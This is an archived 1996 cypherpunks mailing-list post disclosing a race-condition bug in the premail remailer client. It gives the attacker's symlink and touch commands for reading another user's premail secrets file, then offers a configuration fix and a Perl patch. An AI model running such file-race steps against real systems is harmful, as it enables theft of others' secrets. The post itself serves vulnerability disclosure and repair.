@@ -1,0 +1,130 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: Security hole in premail -->
+<!--X-From-R13: [vkznfgre <yhpvsreNquc.pbz> -->
+<!--X-Date: Fri, 20 Dec 1996 18:50:29 &#45;0800 (PST) -->
+<!--X-Message-Id: 199612210235.VAA03805@dhp.com -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>Security hole in premail</TITLE>
+<LINK REV="made" HREF="mailto:lucifer@dhp.com">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg01397.html">Date Prev</A>][<A HREF="msg01382.html">Date Next</A>][<A HREF="msg01388.html">Thread Prev</A>][<A HREF="msg01475.html">Thread Next</A>][<A HREF="index.html#01396">Date Index</A>][<A HREF="threads.html#01396">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>Security hole in premail</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Subject</em>: Security hole in premail</LI>
+<LI><em>From</em>: Mixmaster &lt;<A HREF="mailto:lucifer@dhp.com">lucifer@dhp.com</A>&gt;</LI>
+<LI><em>Date</em>: Fri, 20 Dec 1996 21:35:35 -0500</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+There's a pretty nasty bug in premail that allows any non-root to obtain the
+contents of the premail secrets file.  This is a race condition that can be
+exploited because an indefinite amount of time can pass between the time that
+premail checks if the secrets file exists and when it tries to write to the
+file.  It can be exploited as follows:
+
+attacker:
+
+$ umask 111
+$ ln -s ~/premail-secrets-file /tmp/.premail-secrets.$&lt;
+
+normal user:
+
+$ premail -login
+Remember to logout when done.
+Your premail passphrase, please:
+
+All the attacker has to do is execute "touch premail-secrets-file" between the
+time that the user is prompted for the passphrase and the time when the login
+is completed.
+
+$ ls -al premail-secrets-file
+-rw-rw-rw-   1 d00d    nogroup          19 Dec 20 19:01 premail-secrets-file 
+$ cat premail-secrets-file
+[contents of premail secrets file]
+
+This bug can be fixed in two ways.  One way is to set the premail-secrets
+setting to some non-world-writable directory.  The second way is to apply the
+following patch:
+
+*** premail.orig	Fri Dec 20 18:46:01 1996
+--- premail	Fri Dec 20 18:55:54 1996
+***************
+*** 3574,3579 ****
+--- 3574,3582 ----
+      }
+      for ($triesleft = 2; !$done &amp;&amp; $triesleft; $triesleft--) {
+  	$pass = &amp;getpass ($x);
++ 	if(!-O $ps) {
++ 		&amp;error ("Secrets file exists and is owned by another user\n");
++ 	}
+  	$status = &amp;decrypt_secrets ($ps_pgp, $ps, $pass);
+  	if (!-s $ps) { unlink $ps; }
+  	$done = (!$status &amp;&amp; -e $ps);
+
+
+
+
+
+
+
+
+
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg01397.html">Re: Executing Encrypted Code</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg01382.html">Instruction Sets which are tough to emulate</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg01388.html">Yiddish humor</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg01475.html">Re: Security hole in premail</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#01396"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#01396"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
